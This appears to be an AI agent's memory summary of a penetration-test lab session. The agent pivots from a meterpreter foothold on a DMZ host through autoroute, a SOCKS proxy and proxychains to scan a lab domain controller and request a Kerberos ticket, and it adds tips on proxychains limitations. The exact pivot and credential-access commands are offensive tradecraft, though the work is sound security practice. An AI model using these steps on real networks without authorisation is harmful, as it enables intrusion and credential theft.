thread_id: 019063d1-fe84-7234-866c-753f9bcf0620
updated_at: 2026-06-25T14:49:59+00:00
rollout_path: C:\Users\<USER>\.codex\sessions\2026\06\25\rollout-2026-06-25T22-29-59-019063d1-fe84-7234-866c-753f9bcf0620.jsonl
cwd: \\?\C:\Workspace\pentest-lab

# Pivoted from an initial meterpreter session on a DMZ host to an internal network via `autoroute` + `socks_proxy`, reached a lab AD DC.

Rollout context: cwd was `C:\Workspace\pentest-lab`, Kali VM + lab network with DMZ (10.10.10.0/24) and internal (10.10.20.0/24). Foothold on 10.10.10.5 via a prior exercise; goal reach `dc.lab.local` on 10.10.20.10.

## Task 1: Meterpreter autoroute → SOCKS proxy → proxychains → domain enumeration

Outcome: success

Preference signals:
- Chinese narration; msf commands in English.
- The user wanted the pivot documented as msfconsole rc-file so re-running takes one command.

Key steps:
- On the meterpreter session: `run autoroute -s 10.10.20.0/24` — routed the internal subnet through the beacon.
- Started SOCKS: `use auxiliary/server/socks_proxy; set SRVPORT 1080; set VERSION 5; run -j`.
- Configured `/etc/proxychains4.conf` with `socks5 127.0.0.1 1080`.
- `proxychains nmap -sT -Pn -p 445,88,389,3389 10.10.20.10` — reached the DC through the tunnel.
- `proxychains impacket-getTGT lab.local/user:pass@10.10.20.10` — Kerberos TGT via the pivot; verified subsequent Rubeus-through-proxychains worked.

Failures and how to do differently:
- First `-sS` (SYN scan) failed through SOCKS — proxychains only supports full TCP connect. Used `-sT`.
- Ping (`-Pn` required) — proxychains doesn't tunnel ICMP.
- ARP scan of the internal subnet failed for the same reason; used a TCP-only host discovery scan.

Reusable knowledge:
- msf `autoroute` + `socks_proxy` is the standard pivot combo. socks5 is preferred over socks4 for Kerberos auth over the tunnel.
- proxychains limitations: TCP only, no ICMP, no UDP. For UDP protocols use `chisel` or `revsocks` instead.
- Always `-Pn -sT` when scanning through proxychains; `--top-ports 20` speeds initial recon.

References:
- [1] rc-file: `pivot.rc`
- [2] Metasploit 6.4 + proxychains-ng 4.16
- [3] Reference: HackTricks pivoting > meterpreter section
